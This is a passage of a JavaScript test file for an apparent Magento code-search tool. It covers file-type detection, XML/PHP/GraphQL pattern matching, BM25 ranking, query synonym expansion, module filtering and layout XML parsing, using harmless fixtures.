    trace: { controller: { className: 'Cart\\Add' }, plugins: [{}, {}] }
  });
  assertIncludes(s1, 'Route checkout/cart/add', 'route summary');
  assertIncludes(s1, 'Cart\\Add::execute()', 'controller class in summary');
  assertIncludes(s1, '2 plugins', 'plugin count');

  const s2 = buildTraceSummary({
    entryPoint: '/V1/products', entryType: 'api',
    trace: { serviceClass: { className: 'ProductRepo' } }
  });
  assertIncludes(s2, 'API /V1/products', 'api summary');
  assertIncludes(s2, 'ProductRepo', 'service class');

  const s3 = buildTraceSummary({
    entryPoint: 'sales_order_place_after', entryType: 'event',
    trace: { observers: [{}, {}, {}] }
  });
  assertIncludes(s3, 'Event', 'event summary');
  assertIncludes(s3, '3 observers', 'observer count');

  const s4 = buildTraceSummary({
    entryPoint: 'placeOrder', entryType: 'graphql',
    trace: { resolver: { className: 'PlaceOrderResolver' } }
  });
  assertIncludes(s4, 'GraphQL placeOrder', 'graphql summary');

  const s5 = buildTraceSummary({
    entryPoint: 'catalog_reindex', entryType: 'cron',
    trace: { handler: { path: 'Cron/Reindex.php' } }
  });
  assertIncludes(s5, 'Cron catalog_reindex', 'cron summary');
  assertIncludes(s5, 'Cron/Reindex.php', 'handler path fallback');

  // Empty trace
  const s6 = buildTraceSummary({ entryPoint: 'foo/bar', entryType: 'route', trace: {} });
  assertEq(s6, 'Route foo/bar', 'empty trace: just entry point');

  // Singular vs plural
  const s7 = buildTraceSummary({
    entryPoint: 'test', entryType: 'route',
    trace: { plugins: [{}], observers: [{}, {}], templates: [{}, {}, {}] }
  });
  assertIncludes(s7, '1 plugin', 'singular plugin');
  assertIncludes(s7, '2 observers', 'plural observers');
  assertIncludes(s7, '3 templates', 'template count');
}

// ─── Extended Magento Patterns Tests ────────────────────────────

async function testMagentoPatternsExtended() {
  console.log('\n── Magento Patterns (extended) ──');

  const {
    XML_PATTERNS, PHP_PATTERNS, GRAPHQL_PATTERNS,
    detectMagentoFileType, extractPhpMagentoMetadata,
    extractXmlMagentoMetadata, extractGraphqlMetadata,
    detectArea, extractModuleInfo, AREAS, CORE_INTERFACES
  } = await import('../src/magento-patterns.js');

  // ── detectMagentoFileType (more types) ──
  assertEq(detectMagentoFileType('app/code/V/M/Model/Product.php'), 'Model', 'Model detected');
  assertEq(detectMagentoFileType('vendor/x/module-y/Model/ResourceModel/Foo.php'), 'ResourceModel', 'ResourceModel');
  assertEq(detectMagentoFileType('vendor/x/module-y/Observer/Foo.php'), 'Observer', 'Observer');
  assertEq(detectMagentoFileType('vendor/x/module-y/Helper/Data.php'), 'Helper', 'Helper');
  assertEq(detectMagentoFileType('vendor/x/module-y/Cron/Cleanup.php'), 'Cron', 'Cron');
  assertEq(detectMagentoFileType('vendor/x/module-y/ViewModel/Foo.php'), 'ViewModel', 'ViewModel');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/events.xml'), 'events.xml', 'events.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/webapi.xml'), 'webapi.xml', 'webapi.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/crontab.xml'), 'crontab.xml', 'crontab.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/db_schema.xml'), 'db_schema.xml', 'db_schema.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/module.xml'), 'module.xml', 'module.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/adminhtml/system.xml'), 'system.xml', 'system.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/view/frontend/layout/cat.xml'), 'layout.xml', 'layout.xml');
  assertEq(detectMagentoFileType('vendor/x/module-y/etc/schema.graphqls'), 'graphql_schema', 'graphqls');
  assertEq(detectMagentoFileType('vendor/x/module-y/Api/FooInterface.php'), 'Api', 'Api');
  assertEq(detectMagentoFileType('vendor/x/module-y/Api/Data/Foo.php'), 'ApiData', 'ApiData');
  assertEq(detectMagentoFileType('vendor/x/module-y/Setup/Patch/Data/Add.php'), 'Setup', 'Setup');
  assertEq(detectMagentoFileType('vendor/x/module-y/Console/Command/Import.php'), 'Console', 'Console');
  assertEq(detectMagentoFileType('vendor/x/module-y/view/frontend/web/js/foo.js'), null, 'JS returns null');

  // ── detectArea ──
  assertEq(detectArea('vendor/x/etc/adminhtml/routes.xml'), 'adminhtml', 'adminhtml area');
  assertEq(detectArea('vendor/x/view/frontend/templates/foo.phtml'), 'frontend', 'frontend area');
  assertEq(detectArea('vendor/x/etc/webapi_rest/di.xml'), 'webapi_rest', 'webapi_rest area');
  assertEq(detectArea('vendor/x/etc/di.xml'), 'global', 'global area default');

  // ── Constants ──
  assertEq(AREAS.length, 7, 'AREAS has 7 entries');
  assertEq(CORE_INTERFACES['Magento\\Framework\\App\\ActionInterface'], 'Controller', 'ActionInterface mapped');
  assertEq(CORE_INTERFACES['Magento\\Framework\\Event\\ObserverInterface'], 'Observer', 'ObserverInterface mapped');

  // ── extractModuleInfo edge cases ──
  assertEq(extractModuleInfo('random/path.php'), null, 'non-module returns null');
  const multi = extractModuleInfo('vendor/magento/module-catalog-rule/Model/Rule.php');
  assertEq(multi.module, 'CatalogRule', 'multi-word module merged');

  // ── PHP_PATTERNS (after, around, controller, repo, model, observer, resolver, console) ──
  const afterMatches = [..."public function afterGetPrice(\$s, \$r) {}".matchAll(PHP_PATTERNS.plugin.after)];
  assertEq(afterMatches.length, 1, 'after plugin matches');
  const aroundMatches = [..."public function aroundSave(\$s, callable \$p) {}".matchAll(PHP_PATTERNS.plugin.around)];
  assertEq(aroundMatches.length, 1, 'around plugin matches');
  assert(PHP_PATTERNS.controller.execute.test('public function execute()'), 'controller execute');
  assert(PHP_PATTERNS.repository.getById.test('public function getById('), 'repo getById');
  assert(PHP_PATTERNS.repository.getList.test('public function getList('), 'repo getList');
  assert(PHP_PATTERNS.repository.save.test('public function save('), 'repo save');
  assert(PHP_PATTERNS.model.beforeSave.test('protected function _beforeSave('), 'model beforeSave');
  assert(PHP_PATTERNS.model.afterSave.test('protected function _afterSave('), 'model afterSave');
  assert(PHP_PATTERNS.model.construct.test('protected function _construct('), 'model _construct');
  assert(PHP_PATTERNS.observer.execute.test('public function execute(Observer $observer)'), 'observer execute');
  assert(PHP_PATTERNS.block.toHtml.test('protected function _toHtml('), 'block toHtml');
  assert(PHP_PATTERNS.block.prepareLayout.test('protected function _prepareLayout('), 'block prepareLayout');
  assert(PHP_PATTERNS.resolver.resolve.test('public function resolve(Field $field'), 'resolver resolve');
  assert(PHP_PATTERNS.console.configure.test('protected function configure('), 'console configure');

  // ── XML_PATTERNS (webapi, system, db_schema, crontab, layout, acl) ──
  const webapiXml = '<route url="/V1/products" method="GET"><service class="Repo" method="getList"/><resource ref="Cat::prods"/></route>';
  assertEq([...webapiXml.matchAll(XML_PATTERNS.webapi.route)].length, 1, 'webapi route');
  assertEq([...webapiXml.matchAll(XML_PATTERNS.webapi.service)].length, 1, 'webapi service');
  assertEq([...webapiXml.matchAll(XML_PATTERNS.webapi.resource)].length, 1, 'webapi resource');

  const sysXml = '<section id="pay"><group id="stripe"><field id="key"><source_model>Enc</source_model><backend_model>B</backend_model></field></group></section>';
  assertEq([...sysXml.matchAll(XML_PATTERNS.system.section)].length, 1, 'system section');
  assertEq([...sysXml.matchAll(XML_PATTERNS.system.group)].length, 1, 'system group');
  assertEq([...sysXml.matchAll(XML_PATTERNS.system.field)].length, 1, 'system field');
  assertEq([...sysXml.matchAll(XML_PATTERNS.system.sourceModel)].length, 1, 'system sourceModel');
  assertEq([...sysXml.matchAll(XML_PATTERNS.system.backendModel)].length, 1, 'system backendModel');

  const dbXml = '<table name="sales"><column xsi:type="int" name="id"/><constraint xsi:type="pk" referenceId="PK"/><index referenceId="IDX"/></table>';
  assertEq([...dbXml.matchAll(XML_PATTERNS.dbSchema.table)].length, 1, 'dbSchema table');
  assertEq([...dbXml.matchAll(XML_PATTERNS.dbSchema.column)].length, 1, 'dbSchema column');
  assertEq([...dbXml.matchAll(XML_PATTERNS.dbSchema.constraint)].length, 1, 'dbSchema constraint');
  assertEq([...dbXml.matchAll(XML_PATTERNS.dbSchema.index)].length, 1, 'dbSchema index');

  const cronXml = '<job name="clean" instance="V\\M\\Cron\\Clean" method="run"><schedule>0 2 * * *</schedule></job>';
  assertEq([...cronXml.matchAll(XML_PATTERNS.crontab.job)].length, 1, 'crontab job');
  assertEq([...cronXml.matchAll(XML_PATTERNS.crontab.schedule)].length, 1, 'crontab schedule');

  const layXml = '<block class="V\\M\\Block\\Foo"/><container name="main"/><referenceBlock name="nav"/><referenceContainer name="side"/><uiComponent name="grid"/>';
  assertEq([...layXml.matchAll(XML_PATTERNS.layout.block)].length, 1, 'layout block');
  assertEq([...layXml.matchAll(XML_PATTERNS.layout.container)].length, 1, 'layout container');
  assertEq([...layXml.matchAll(XML_PATTERNS.layout.referenceBlock)].length, 1, 'layout referenceBlock');
  assertEq([...layXml.matchAll(XML_PATTERNS.layout.referenceContainer)].length, 1, 'layout refContainer');
  assertEq([...layXml.matchAll(XML_PATTERNS.layout.uiComponent)].length, 1, 'layout uiComponent');

  assertEq([...'<resource id="A"/><resource id="B"/>'.matchAll(XML_PATTERNS.acl.resource)].length, 2, 'acl 2 resources');

  // ── GRAPHQL_PATTERNS ──
  const gql = 'type Product { sku: String }\ninterface FooI { }\ninput FooInput { }\nenum ColorEnum { RED }';
  assert([...gql.matchAll(GRAPHQL_PATTERNS.type)].length >= 1, 'gql type');
  assertEq([...gql.matchAll(GRAPHQL_PATTERNS.interface)].length, 1, 'gql interface');
  assertEq([...gql.matchAll(GRAPHQL_PATTERNS.input)].length, 1, 'gql input');
  assertEq([...gql.matchAll(GRAPHQL_PATTERNS.enum)].length, 1, 'gql enum');

  // ── extractPhpMagentoMetadata ──
  // Note: extractPhpMagentoMetadata overwrites pluginMethods per plugin type (before/after/around)
  // so we test with multiple methods of the same type
  const pluginPhp = `class P {
    public function beforeSave(\$s,\$p){}
    public function beforeLoad(\$s,\$id){}
}`;
  const pMeta = extractPhpMagentoMetadata(pluginPhp, 'vendor/x/Plugin/P.php');
  assert(pMeta.isPlugin, 'extractPhp: isPlugin');
  assertEq(pMeta.pluginMethods.length, 2, 'extractPhp: 2 before plugin methods');
  assert(pMeta.pluginMethods.every(m => m.type === 'before'), 'extractPhp: all are before type');

  const ctrlPhp = 'class V { public function execute() { return $this->resultFactory->create(ResultFactory::TYPE_PAGE); } }';
  const cMeta = extractPhpMagentoMetadata(ctrlPhp, 'vendor/x/Controller/V.php');
  assert(cMeta.isController, 'extractPhp: isController');
  assert(cMeta.resultTypes?.includes('PAGE'), 'extractPhp: PAGE result');

  const repoPhp = 'class R { public function getById($id){} public function save($e){} public function getList($c){} }';
  const rMeta = extractPhpMagentoMetadata(repoPhp, 'vendor/x/Model/R.php');
  assert(rMeta.isRepository, 'extractPhp: isRepository');

  const obsPhp = 'public function execute(Observer $observer) {}';
  assert(extractPhpMagentoMetadata(obsPhp, 'vendor/x/Observer/O.php').isObserver, 'extractPhp: isObserver');

  const resPhp = 'public function resolve(Field $field, $ctx, ResolveInfo $info) {}';
  assert(extractPhpMagentoMetadata(resPhp, 'vendor/x/Resolver/R.php').isResolver, 'extractPhp: isResolver');

  const diPhp = 'class F { public function __construct(LoggerInterface $logger, Repo $repo) {} }';
  const dMeta = extractPhpMagentoMetadata(diPhp, 'vendor/x/Model/F.php');
  assertEq(dMeta.dependencies?.length, 2, 'extractPhp: 2 deps');
  assertEq(dMeta.dependencies[0].variable, 'logger', 'extractPhp: dep variable');

  // ── extractXmlMagentoMetadata ──
  const diXml = '<config><preference for="FI" type="FM"/><virtualType name="VP" type="P"/><type name="B"><plugin name="bp" type="BP"/></type></config>';
  const xMeta = extractXmlMagentoMetadata(diXml, 'vendor/x/etc/di.xml');
  assertEq(xMeta.preferences?.length, 1, 'extractXml: 1 pref');
  assertEq(xMeta.virtualTypes?.length, 1, 'extractXml: 1 vt');
  assertEq(xMeta.plugins?.length, 1, 'extractXml: 1 plugin');

  const evXml = '<config><event name="ev1"><observer name="o1" instance="O1"/></event></config>';
  const eMeta = extractXmlMagentoMetadata(evXml, 'vendor/x/etc/events.xml');
  assertEq(eMeta.events[0], 'ev1', 'extractXml: event name');
  assertEq(eMeta.observers[0].instance, 'O1', 'extractXml: observer instance');

  const crXml = '<config><group id="d"><job name="j1" instance="J1" method="run"><schedule>* * * * *</schedule></job></group></config>';
  assertEq(extractXmlMagentoMetadata(crXml, 'vendor/x/etc/crontab.xml').cronJobs[0].name, 'j1', 'extractXml: cron name');

  const schXml = '<schema><table name="tbl"><column xsi:type="int" name="c1"/></table></schema>';
  const sMeta = extractXmlMagentoMetadata(schXml, 'vendor/x/etc/db_schema.xml');
  assertEq(sMeta.tables[0], 'tbl', 'extractXml: table name');
  assertEq(sMeta.columns[0], 'c1', 'extractXml: column name');

  // ── extractGraphqlMetadata ──
  const gqlFull = 'type Q { sku: String }\ninterface QI { }\ntype Query { products(f: F): P\n categories(f: F): C }\ntype Mutation { createP(i: I): P }';
  const gMeta = extractGraphqlMetadata(gqlFull, 'vendor/x/etc/schema.graphqls');
  assert(gMeta.queries.includes('products'), 'extractGql: query products');
  assert(gMeta.queries.includes('categories'), 'extractGql: query categories');
  assert(gMeta.mutations.includes('createP'), 'extractGql: mutation createP');
}

// ─── Error Pattern Edge Cases ──────────────────────────────────

function testErrorPatternEdgeCases() {
  console.log('\n── Error Pattern Edge Cases ──');

  const classRegex = /([\w\\]{2,}(?:\\[\w]+)+)/g;

  // Single FQCN
  assertEq([...'Error in Magento\\Catalog\\Model\\Product'.matchAll(classRegex)].length, 1, 'extracts single FQCN');

  // Multiple FQCNs
  assertEq([...'Cannot cast Magento\\Sales\\Order to Magento\\Quote\\Quote'.matchAll(classRegex)].length, 2, '2 FQCNs');

  // 3+ classes in complex error
  const e3 = 'Magento\\Framework\\Exception: Cannot instantiate Magento\\Catalog\\Api\\Repo, ref in Magento\\Catalog\\Controller\\View';
  assert([...e3.matchAll(classRegex)].length >= 3, '3+ classes from complex error');

  // Stack trace line parsing
  const stackRegex = /#\d+\s+([\w\/\-.]+\.php)(?:\((\d+)\))?/g;
  const stack = '#0 /srv/vendor/Factory.php(121): create()\n#1 /srv/app/code/Service.php(34): run()';
  const entries = [...stack.matchAll(stackRegex)];
  assertEq(entries.length, 2, '2 stack entries');
  assertEq(entries[1][2], '34', 'line number from stack');

  // Stack without line number
  const s2 = [...'#0 /srv/foo.php: bar()'.matchAll(stackRegex)];
  assertEq(s2[0][2], undefined, 'no line number -> undefined');

  // No classes in plain text
  assertEq([...'Something failed'.matchAll(classRegex)].length, 0, 'no FQCNs in plain text');
}

// ─── LRU Cache Logic Tests ─────────────────────────────────────

function testCacheLogic() {
  console.log('\n── Cache Logic ──');

  const cache = new Map();
  const CACHE_MAX = 5;
  function cacheSet(key, value) {
    if (cache.size >= CACHE_MAX) {
      const oldest = cache.keys().next().value;
      cache.delete(oldest);
    }
    cache.set(key, value);
  }

  for (let i = 0; i < 5; i++) cacheSet(`key${i}`, `val${i}`);
  assertEq(cache.size, 5, 'cache fills to max');
  assert(cache.has('key0'), 'key0 exists');

  cacheSet('key5', 'val5');
  assertEq(cache.size, 5, 'cache stays at max after eviction');
  assert(!cache.has('key0'), 'key0 evicted');
  assert(cache.has('key5'), 'key5 added');

  cacheSet('key6', 'val6');
  assert(!cache.has('key1'), 'key1 evicted');

  cacheSet('key3', 'updated');
  assertEq(cache.get('key3'), 'updated', 'overwrite updates value');
}

// ─── DI XML Multi-Area Parsing Tests ───────────────────────────

async function testDiXmlMultiArea() {
  console.log('\n── DI XML Multi-Area ──');

  const tmpDir = path.join(__dirname, '..', '.test-tmp-multi');
  const globalDir = path.join(tmpDir, 'vendor', 'test', 'module-x', 'etc');
  const frontDir = path.join(tmpDir, 'vendor', 'test', 'module-x', 'etc', 'frontend');
  const adminDir = path.join(tmpDir, 'vendor', 'test', 'module-x', 'etc', 'adminhtml');
  mkdirSync(globalDir, { recursive: true });
  mkdirSync(frontDir, { recursive: true });
  mkdirSync(adminDir, { recursive: true });

  writeFileSync(path.join(globalDir, 'di.xml'), `<config>
    <preference for="Vendor\\Module\\Api\\ServiceInterface" type="Vendor\\Module\\Model\\Service"/>
    <type name="Vendor\\Module\\Api\\ServiceInterface">
        <plugin name="global_logger" type="Vendor\\Module\\Plugin\\LoggerPlugin"/>
    </type>
</config>`);
  writeFileSync(path.join(frontDir, 'di.xml'), `<config>
    <preference for="Vendor\\Module\\Api\\ServiceInterface" type="Vendor\\Module\\Model\\FrontendService"/>
</config>`);
  writeFileSync(path.join(adminDir, 'di.xml'), `<config>
    <type name="Vendor\\Module\\Api\\ServiceInterface">
        <plugin name="admin_auth_check" type="Vendor\\Module\\Plugin\\AdminAuthPlugin"/>
    </type>
</config>`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFs } = await import('fs');
  const diFiles = await globFn('**/etc/**/di.xml', { cwd: tmpDir, absolute: true });

  const className = 'ServiceInterface';
  const classLower = className.toLowerCase();
  const preferences = [];
  const plugins = [];

  for (const diFile of diFiles) {
    const content = readFs(diFile, 'utf-8');
    const rel = diFile.replace(tmpDir + '/', '');

    let m;
    const prefRx = /<preference\s+for="([^"]+)"\s+type="([^"]+)"\s*\/?>/g;
    while ((m = prefRx.exec(content)) !== null) {
      if (m[1].toLowerCase().includes(classLower)) preferences.push({ type: m[2], file: rel });
    }

    const tbRx = /<type\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/type>/g;
    let tb;
    while ((tb = tbRx.exec(content)) !== null) {
      if (tb[1].toLowerCase().includes(classLower)) {
        const plRx = /<plugin\s+name="([^"]+)"[^>]*type="([^"]+)"[^>]*\/?>/g;
        let pm;
        while ((pm = plRx.exec(tb[2])) !== null) plugins.push({ name: pm[1], file: rel });
      }
    }
  }

  assertEq(preferences.length, 2, 'multi-area: 2 preferences');
  assert(preferences.some(p => p.type.includes('Service') && !p.type.includes('Frontend')), 'multi-area: global pref');
  assert(preferences.some(p => p.type.includes('FrontendService')), 'multi-area: frontend pref');
  assertEq(plugins.length, 2, 'multi-area: 2 plugins');
  assert(plugins.some(p => p.name === 'global_logger'), 'multi-area: global plugin');
  assert(plugins.some(p => p.name === 'admin_auth_check'), 'multi-area: admin plugin');

  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
}

// ─── BM25 Scoring Tests ────────────────────────────────────────

function testBm25Scoring() {
  console.log('\n── BM25 Scoring ──');

  // bm25Score implementation (mirrors mcp-server.js)
  function bm25Score(queryTerms, text, k1 = 1.2, b = 0.75) {
    if (!text || !queryTerms.length) return 0;
    const words = text.toLowerCase().split(/[\W_]+/).filter(Boolean);
    const docLen = words.length;
    const avgDocLen = 200;
    let score = 0;
    for (const term of queryTerms) {
      const termLower = term.toLowerCase();
      const tf = words.filter(w => w === termLower).length;
      if (tf === 0) continue;
      const numerator = tf * (k1 + 1);
      const denominator = tf + k1 * (1 - b + b * (docLen / avgDocLen));
      score += numerator / denominator;
    }
    return score;
  }

  // Empty inputs
  assertEq(bm25Score([], 'some text'), 0, 'BM25: empty query returns 0');
  assertEq(bm25Score(['test'], ''), 0, 'BM25: empty text returns 0');
  assertEq(bm25Score(['test'], null), 0, 'BM25: null text returns 0');

  // Single term match
  const score1 = bm25Score(['product'], 'this is a product class for product management');
  assert(score1 > 0, 'BM25: matching term produces positive score', `score=${score1.toFixed(3)}`);

  // Multiple term matches
  const score2 = bm25Score(['product', 'price'], 'product price calculation for product pricing');
  assert(score2 > score1, 'BM25: multiple matching terms score higher', `${score2.toFixed(3)} > ${score1.toFixed(3)}`);

  // No match
  const score3 = bm25Score(['xyz'], 'product price calculation');
  assertEq(score3, 0, 'BM25: non-matching term returns 0');

  // Case insensitive
  const score4 = bm25Score(['Product'], 'product repository');
  assert(score4 > 0, 'BM25: case-insensitive matching');

  // Exact class name match
  const score5 = bm25Score(['productrepository'], 'class ProductRepository extends AbstractModel');
  assert(score5 > 0, 'BM25: class name in text scores positively');

  // Hybrid rerank test
  function hybridRerank(results, query, bm25Weight = 0.3) {
    if (!results.length || !query) return results;
    const queryTerms = query.toLowerCase().split(/[\s_\\]+/).filter(t => t.length > 2);
    if (!queryTerms.length) return results;
    return results.map(r => {
      const textScore = bm25Score(queryTerms, (r.searchText || '') + ' ' + (r.className || '') + ' ' + (r.path || ''));
      const bonus = Math.min(textScore * bm25Weight, 1.0);
      return { ...r, score: (r.score || 0) + bonus, bm25: textScore };
    }).sort((a, b) => b.score - a.score);
  }

  const testResults = [
    { path: 'vendor/module-a/Model/Order.php', className: 'Order', searchText: 'order model', score: 0.8 },
    { path: 'vendor/module-b/Model/ProductRepository.php', className: 'ProductRepository', searchText: 'product repository save getById', score: 0.7 },
  ];
  const reranked = hybridRerank(testResults, 'ProductRepository');
  assertEq(reranked[0].className, 'ProductRepository', 'Hybrid rerank: exact class name match boosted to top');
  assert(reranked[0].bm25 > 0, 'Hybrid rerank: BM25 score attached');
}

// ─── Query Expansion Tests ─────────────────────────────────────

function testQueryExpansion() {
  console.log('\n── Query Expansion ──');

  const MAGENTO_SYNONYMS = {
    plugin: ['interceptor', 'around method', 'before after'],
    preference: ['di override', 'rewrite', 'di.xml for type'],
    observer: ['event listener', 'event handler', 'events.xml'],
    model: ['entity', 'resource model'],
    block: ['view block', 'template block'],
    controller: ['action class', 'execute method', 'route handler'],
    cron: ['scheduled task', 'crontab.xml'],
    api: ['rest endpoint', 'webapi', 'endpoint'],
    layout: ['xml layout', 'handle', 'container', 'reference block'],
    checkout: ['cart', 'quote', 'totals collection'],
    order: ['sales order', 'order placement', 'order submit'],
    product: ['catalog product', 'product entity'],
    customer: ['customer entity', 'customer account'],
    indexer: ['reindex', 'flat table', 'price index'],
    payment: ['payment method', 'payment gateway', 'payment information'],
    shipping: ['carrier', 'shipping method', 'delivery'],
    stock: ['inventory', 'salable quantity', 'source item'],
  };

  function expandQuery(query) {
    const terms = query.toLowerCase().split(/\s+/);
    const expanded = [query];
    for (const term of terms) {
      const synonyms = MAGENTO_SYNONYMS[term];
      if (synonyms) {
        expanded.push(...synonyms);
      }
    }
    return expanded.join(' ');
  }

  // Basic expansion
  const expanded1 = expandQuery('plugin save');
  assertIncludes(expanded1, 'interceptor', 'Expansion: "plugin" → includes "interceptor"');
  assertIncludes(expanded1, 'around method', 'Expansion: "plugin" → includes "around method"');
  assertIncludes(expanded1, 'plugin save', 'Expansion: original query preserved');

  // Multiple terms expanded
  const expanded2 = expandQuery('checkout observer');
  assertIncludes(expanded2, 'cart', 'Expansion: "checkout" → includes "cart"');
  assertIncludes(expanded2, 'event listener', 'Expansion: "observer" → includes "event listener"');

  // No expansion for unknown terms
  const expanded3 = expandQuery('foobar xyz');
  assertEq(expanded3, 'foobar xyz', 'Expansion: unknown terms unchanged');

  // All synonym categories covered
  for (const key of Object.keys(MAGENTO_SYNONYMS)) {
    const exp = expandQuery(key);
    assert(exp.length > key.length, `Expansion: "${key}" expands`, `length ${key.length} → ${exp.length}`);
  }
}

// ─── Module Filtering Tests ────────────────────────────────────

function testModuleFiltering() {
  console.log('\n── Module Filtering ──');

  // Updated filterByModule matching the new implementation in mcp-server.js
  function filterByModule(results, moduleFilter) {
    if (!moduleFilter) return results;
    const patterns = Array.isArray(moduleFilter) ? moduleFilter : [moduleFilter];
    return results.filter(r => {
      const mod = r.module || '';
      const filePath = r.path || '';
      return patterns.some(pat => {
        if (pat.includes('*')) {
          const normalized = pat.replace(/[/_]/g, '[/_]');
          const regex = new RegExp('^' + normalized.replace(/\*/g, '.*') + '$', 'i');
          if (regex.test(mod) || regex.test(filePath)) return true;
          const vendorPrefix = pat.split(/[/*_]/)[0];
          if (vendorPrefix) {
            const pfx = vendorPrefix.toLowerCase();
            if (mod.toLowerCase().startsWith(pfx)) return true;
            if (filePath.toLowerCase().includes('vendor/' + pfx) ||
                filePath.toLowerCase().includes('app/code/' + pfx)) return true;
          }
          return false;
        }
        const patLower = pat.toLowerCase();
        if (mod.toLowerCase().includes(patLower) || filePath.toLowerCase().includes(patLower)) return true;
        const patParts = patLower.split(/[/_]/);
        if (patParts.length >= 2) {
          const modLower = mod.toLowerCase();
          const modParts = modLower.split(/[/_]/);
          if (modParts.length >= 2) {
            const vendorMatch = modParts[0].startsWith(patParts[0]) || patParts[0].startsWith(modParts[0]);
            const modulePart = modParts.slice(1).join('-');
            const patModule = patParts.slice(1).join('-');
            const moduleMatch = modulePart.includes(patModule) || modulePart.replace(/^module-/, '').includes(patModule);
            if (vendorMatch && moduleMatch) return true;
          }
        }
        return false;
      });
    });
  }

  const testResults = [
    { path: 'vendor/magento/module-catalog/Model/Product.php', module: 'Magento_Catalog' },
    { path: 'vendor/custom/module-pricing/Model/Price.php', module: 'Custom_Pricing' },
    { path: 'vendor/magento/module-sales/Model/Order.php', module: 'Magento_Sales' },
    { path: 'app/code/Acme/Feature/Model/Widget.php', module: 'Acme_Feature' },
  ];

  // No filter returns all
  const all = filterByModule(testResults, null);
  assertEq(all.length, 4, 'Module filter: null returns all');

  // Exact match
  const exact = filterByModule(testResults, 'Magento_Catalog');
  assertEq(exact.length, 1, 'Module filter: exact match');
  assertEq(exact[0].module, 'Magento_Catalog', 'Module filter: correct module');

  // Wildcard match
  const wildcard = filterByModule(testResults, 'Magento_*');
  assertEq(wildcard.length, 2, 'Module filter: wildcard matches 2 modules');

  // Path-based match
  const pathMatch = filterByModule(testResults, 'custom');
  assertEq(pathMatch.length, 1, 'Module filter: path-based match');

  // Case insensitive
  const caseMatch = filterByModule(testResults, 'acme');
  assertEq(caseMatch.length, 1, 'Module filter: case insensitive');

  // Array of patterns
  const multi = filterByModule(testResults, ['Magento_Catalog', 'Acme_*']);
  assertEq(multi.length, 2, 'Module filter: array of patterns');

  // No match
  const noMatch = filterByModule(testResults, 'NonExistent');
  assertEq(noMatch.length, 0, 'Module filter: no match returns empty');

  // ── New: separator normalization and vendor prefix matching ──
  const composerResults = [
    { path: 'vendor/acme-extensions/module-order-split/Model/Split.php', module: 'acme-extensions_module-order-split' },
    { path: 'vendor/acme/module-quote/Plugin/Plugin.php', module: 'acme_module-quote' },
    { path: 'vendor/magento/module-catalog/Model/Product.php', module: 'magento_module-catalog' },
    { path: 'vendor/magento/module-sales/Model/Order.php', module: 'magento_module-sales' },
    { path: 'vendor/thirdparty/sdk-php-front/src/Request.php', module: 'thirdparty_sdk-php-front' },
  ];

  // Wildcard with / separator should match _ separator in module field
  const slashWild = filterByModule(composerResults, 'magento/*');
  assertEq(slashWild.length, 2, 'Module filter: slash wildcard matches underscore modules');

  // Vendor prefix: "acme/*" should match both "acme_" and "acme-extensions_"
  const vendorPrefix = filterByModule(composerResults, 'acme/*');
  assertEq(vendorPrefix.length, 2, 'Module filter: vendor prefix matches related vendors');

  // Exact vendor: "acme-extensions/*" should match only acme-extensions
  const exactVendor = filterByModule(composerResults, 'acme-extensions/*');
  assertEq(exactVendor.length, 1, 'Module filter: exact vendor wildcard');

  // Non-wildcard structured match: "Magento_Catalog" matches "magento_module-catalog"
  const structuredMatch = filterByModule(composerResults, 'Magento_Catalog');
  assertEq(structuredMatch.length, 1, 'Module filter: structured match strips module- prefix');

  // Slash separator non-wildcard: "Magento/Sales" matches "magento_module-sales"
  const slashNonWild = filterByModule(composerResults, 'Magento/Sales');
  assertEq(slashNonWild.length, 1, 'Module filter: slash non-wildcard structured match');

  // False negative prevention: "thirdparty_catalog" should NOT match "thirdparty_sdk-php-front"
  const falseNeg = filterByModule(composerResults, 'thirdparty_catalog');
  assertEq(falseNeg.length, 0, 'Module filter: no false positive on different module');
}

// ─── Layout XML Parsing Tests ──────────────────────────────────

async function testLayoutXmlParsing() {
  console.log('\n── Layout XML Parsing ──');

  const tmpDir = path.join(__dirname, '..', '.test-tmp-layout');
  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'view', 'frontend', 'layout'), { recursive: true });

  // Create test layout XML
  writeFileSync(path.join(tmpDir, 'view', 'frontend', 'layout', 'catalog_product_view.xml'), `<?xml version="1.0"?>
<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <body>
    <referenceContainer name="content">
      <block class="Magento\\Catalog\\Block\\Product\\View" name="product.info" template="product/view.phtml"/>
      <block class="Magento\\Catalog\\Block\\Product\\Price" name="product.price"/>
    </referenceContainer>
    <referenceBlock name="head.additional">
      <block class="Magento\\Catalog\\Block\\Product\\Meta" name="product.meta"/>
    </referenceBlock>
    <container name="product.sidebar" htmlTag="div"/>
  </body>
</page>`);

  writeFileSync(path.join(tmpDir, 'view', 'frontend', 'layout', 'checkout_index_index.xml'), `<?xml version="1.0"?>
<page>
  <body>
    <referenceContainer name="content">
      <block class="Checkout\\Block\\Onepage" name="checkout.root"/>
    </referenceContainer>
  </body>
</page>`);

  // Test layout parsing (inline version of findLayout)
  const { glob } = await import('glob');
  const { readFileSync: readFile } = await import('fs');

  const layoutFiles = await glob('**/view/**/layout/**/*.xml', { cwd: tmpDir, absolute: true, nodir: true });
  assertEq(layoutFiles.length, 2, 'Layout: found 2 layout files');

  // Parse first file
  const content = readFile(layoutFiles.find(f => f.includes('catalog_product_view')), 'utf-8');
  const blocks = [];
  const blockRegex = /<block\s+[^>]*(?:class|name)="([^"]+)"[^>]*/g;
  let m;
  while ((m = blockRegex.exec(content)) !== null) blocks.push(m[1]);
  assert(blocks.length >= 3, 'Layout: found 3+ blocks in catalog_product_view', `got ${blocks.length}`);

  const containers = [];
  const containerRegex = /<(?:container|referenceContainer)\s+[^>]*name="([^"]+)"[^>]*/g;
  while ((m = containerRegex.exec(content)) !== null) containers.push(m[1]);
  assert(containers.some(c => c === 'content'), 'Layout: found "content" container');
